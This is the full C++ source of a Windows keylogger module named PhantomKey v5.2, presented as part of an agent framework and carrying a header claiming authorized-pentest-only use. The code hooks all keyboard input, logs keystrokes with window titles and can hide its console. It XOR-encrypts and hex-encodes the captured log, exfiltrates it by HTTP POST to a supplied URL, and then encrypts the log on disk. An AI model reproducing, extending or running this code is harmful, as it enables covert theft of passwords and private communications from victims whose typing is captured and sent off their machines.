/*
 * PhantomKey v5.2 - Keylogger Module
 * Part of PhantomShell v5.2 Agent Framework
 *
 * AUTHORIZED USE ONLY. This software is intended solely for use in
 * sanctioned penetration testing engagements and security research
 * with explicit written authorization from the system owner.
 * Unauthorized use of this tool is illegal and unethical.
 * The authors assume no liability for misuse of this software.
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <ctime>

#include "../common/utils.h"

#pragma comment(lib, "winhttp")

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------
std::string  g_logFile;
std::string  g_exfilUrl;                       // empty = no exfiltration
std::string  g_xorKey       = "PhantomKey52";
DWORD        g_duration     = 0;               // seconds, 0 = indefinite
ULONGLONG    g_startTime    = 0;
HHOOK        g_hook         = NULL;
std::string  g_currentWindow;
std::ofstream g_logStream;

// ---------------------------------------------------------------------------
// GetKeyName - translate virtual-key code to a readable string
// ---------------------------------------------------------------------------
static std::string GetKeyName(DWORD vkCode, bool shiftPressed) {
    switch (vkCode) {
        case VK_RETURN:   return "[ENTER]";
        case VK_BACK:     return "[BACKSPACE]";
        case VK_TAB:      return "[TAB]";
        case VK_SPACE:    return " ";
        case VK_ESCAPE:   return "[ESC]";
        case VK_LCONTROL: // fall through
        case VK_RCONTROL: return "[CTRL]";
        case VK_LMENU:    // fall through
        case VK_RMENU:    return "[ALT]";
        case VK_CAPITAL:  return "[CAPSLOCK]";
        case VK_LSHIFT:   // fall through
        case VK_RSHIFT:   return "[SHIFT]";
        case VK_LWIN:     // fall through
        case VK_RWIN:     return "[WIN]";
        case VK_DELETE:   return "[DEL]";
        case VK_INSERT:   return "[INS]";
        case VK_HOME:     return "[HOME]";
        case VK_END:      return "[END]";
        case VK_PRIOR:    return "[PGUP]";
        case VK_NEXT:     return "[PGDN]";
        case VK_LEFT:     return "[LEFT]";
        case VK_RIGHT:    return "[RIGHT]";
        case VK_UP:       return "[UP]";
        case VK_DOWN:     return "[DOWN]";
        case VK_SNAPSHOT: return "[PRTSC]";
        default: break;
    }

    // Function keys F1-F12
    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    // Printable characters via ToUnicode
    BYTE keyboardState[256] = {0};
    GetKeyboardState(keyboardState);
    if (shiftPressed) keyboardState[VK_SHIFT] = 0x80;

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    wchar_t buf[4] = {0};
    int ret = ToUnicode(vkCode, scanCode, keyboardState, buf, 4, 0);
    if (ret > 0) {
        // Convert wide char to narrow (ASCII range is fine for logging)
        char narrow[8] = {0};
        WideCharToMultiByte(CP_UTF8, 0, buf, ret, narrow, sizeof(narrow), NULL, NULL);
        return std::string(narrow);
    }

    return "[0x" + std::to_string(vkCode) + "]";
}

// ---------------------------------------------------------------------------
// Timestamp helper
// ---------------------------------------------------------------------------
static std::string Timestamp() {
    time_t now = time(nullptr);
    struct tm t;
    localtime_s(&t, &now);
    char buf[64];
    strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &t);
    return std::string(buf);
}

// ---------------------------------------------------------------------------
// Keyboard hook callback
// ---------------------------------------------------------------------------
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // Detect window changes
        HWND fg = GetForegroundWindow();
        if (fg) {
            char title[256] = {0};
            GetWindowTextA(fg, title, sizeof(title));
            std::string windowTitle(title);
            if (!windowTitle.empty() && windowTitle != g_currentWindow) {
                g_currentWindow = windowTitle;
                std::string header = "\n--- [" + g_currentWindow + "] --- ["
                                     + Timestamp() + "] ---\n";
                g_logStream << header;
                g_logStream.flush();
            }
        }

        // Shift state
        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        std::string key = GetKeyName(kbs->vkCode, shiftPressed);
        g_logStream << key;
        g_logStream.flush();

        // Check duration limit
        if (g_duration > 0) {
            ULONGLONG elapsed = (GetTickCount64() - g_startTime) / 1000;
            if (elapsed >= g_duration) {
                PostQuitMessage(0);
            }
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ---------------------------------------------------------------------------
// XOR-encrypt a buffer in-place
// ---------------------------------------------------------------------------
static void XorEncrypt(std::vector<char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % key.size()];
    }
}

// ---------------------------------------------------------------------------
// Hex-encode a byte buffer
// ---------------------------------------------------------------------------
static std::string HexEncode(const std::vector<char>& data) {
    std::ostringstream ss;
    for (unsigned char c : data) {
        char hex[4];
        snprintf(hex, sizeof(hex), "%02x", c);
        ss << hex;
    }
    return ss.str();
}

// ---------------------------------------------------------------------------
// ExfiltrateLog - read, encrypt, hex-encode, POST via WinHTTP
// ---------------------------------------------------------------------------
static void ExfiltrateLog(const std::string& logPath) {
    // Read log file
    std::ifstream ifs(logPath, std::ios::binary);
    if (!ifs.is_open()) {
        fprintf(stderr, "[!] ExfiltrateLog: cannot open %s\n", logPath.c_str());
        return;
    }
    std::vector<char> contents((std::istreambuf_iterator<char>(ifs)),
                                std::istreambuf_iterator<char>());
    ifs.close();

    if (contents.empty()) {
        fprintf(stderr, "[!] ExfiltrateLog: log file is empty\n");
        return;
    }

    // XOR-encrypt then hex-encode
    XorEncrypt(contents, g_xorKey);
    std::string payload = HexEncode(contents);

    // Parse URL: expect http://host[:port]/path
    std::string url = g_exfilUrl;
    std::string host, path = "/";
    INTERNET_PORT port = 80;

    size_t schemeEnd = url.find("://");
    if (schemeEnd != std::string::npos) url = url.substr(schemeEnd + 3);

    size_t pathStart = url.find('/');
    if (pathStart != std::string::npos) {
        path = url.substr(pathStart);
        url  = url.substr(0, pathStart);
    }

    size_t colonPos = url.find(':');
    if (colonPos != std::string::npos) {
        port = static_cast<INTERNET_PORT>(std::stoi(url.substr(colonPos + 1)));
        host = url.substr(0, colonPos);
    } else {
        host = url;
    }

    // Convert host to wide string for WinHTTP
    std::wstring wHost(host.begin(), host.end());
    std::wstring wPath(path.begin(), path.end());

    HINTERNET hSession = WinHttpOpen(L"PhantomKey/5.2",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "[!] WinHttpOpen failed: %lu\n", GetLastError());
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), port, 0);
    if (!hConnect) {
        fprintf(stderr, "[!] WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        fprintf(stderr, "[!] WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    BOOL sent = WinHttpSendRequest(hRequest,
                                   L"Content-Type: application/octet-stream\r\n",
                                   -1L,
                                   (LPVOID)payload.c_str(),
                                   (DWORD)payload.size(),
                                   (DWORD)payload.size(),
                                   0);
    if (sent) {
        WinHttpReceiveResponse(hRequest, NULL);
        fprintf(stderr, "[+] Log exfiltrated to %s\n", g_exfilUrl.c_str());
    } else {
        fprintf(stderr, "[!] WinHttpSendRequest failed: %lu\n", GetLastError());
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// ---------------------------------------------------------------------------
// Encrypt log file on disk before exit
// ---------------------------------------------------------------------------
static void EncryptLogOnDisk(const std::string& path) {
    std::fstream fs(path, std::ios::in | std::ios::out | std::ios::binary);
    if (!fs.is_open()) return;

    std::vector<char> data((std::istreambuf_iterator<char>(fs)),
                            std::istreambuf_iterator<char>());
    PhantomUtils::XorCrypt(reinterpret_cast<uint8_t*>(data.data()), data.size(),
                           reinterpret_cast<const uint8_t*>(g_xorKey.data()), g_xorKey.size());

    fs.seekp(0, std::ios::beg);
    fs.write(data.data(), data.size());
    fs.close();
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
#pragma comment(linker, "/SUBSYSTEM:CONSOLE")

int main(int argc, char* argv[]) {
    bool hideConsole = false;

    // Parse arguments
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-o" && i + 1 < argc) {
            g_logFile = argv[++i];
        } else if (arg == "-d" && i + 1 < argc) {
            g_duration = static_cast<DWORD>(std::stoul(argv[++i]));
        } else if (arg == "-u" && i + 1 < argc) {
            g_exfilUrl = argv[++i];
        } else if (arg == "--no-console") {
            hideConsole = true;
        } else {
            fprintf(stderr, "Usage: %s -o <logfile> [-d <seconds>] [-u <url>] [--no-console]\n",
                    argv[0]);
            return 1;
        }
    }

    if (g_logFile.empty()) {
        fprintf(stderr, "[!] Log file path required (-o <path>)\n");
        return 1;
    }

    // Banner
    fprintf(stderr, "[*] PhantomKey v5.2 -- Keylogger\n");
    fprintf(stderr, "[*] Log file : %s\n", g_logFile.c_str());
    fprintf(stderr, "[*] Duration : %s\n", g_duration ? std::to_string(g_duration).c_str() : "indefinite");
    if (!g_exfilUrl.empty())
        fprintf(stderr, "[*] Exfil URL: %s\n", g_exfilUrl.c_str());

    if (hideConsole) {
        FreeConsole();
    }

    // Record start time
    g_startTime = GetTickCount64();

    // Open log file
    g_logStream.open(g_logFile, std::ios::out | std::ios::app);
    if (!g_logStream.is_open()) {
        fprintf(stderr, "[!] Failed to open log file: %s\n", g_logFile.c_str());
        return 1;
    }

    // Install low-level keyboard hook
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hook) {
        fprintf(stderr, "[!] SetWindowsHookExA failed: %lu\n", GetLastError());
        g_logStream.close();
        return 1;
    }

    fprintf(stderr, "[+] Hook installed. Logging keystrokes...\n");

    // Message loop (required for low-level hooks)
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(g_hook);
    g_logStream.close();
    fprintf(stderr, "[*] Hook removed. Cleaning up.\n");

    // Exfiltrate if URL was provided
    if (!g_exfilUrl.empty()) {
        ExfiltrateLog(g_logFile);
    }

    // Encrypt the log file on disk before exit
    EncryptLogOnDisk(g_logFile);
    fprintf(stderr, "[*] Log encrypted on disk. Done.\n");

    return 0;
}
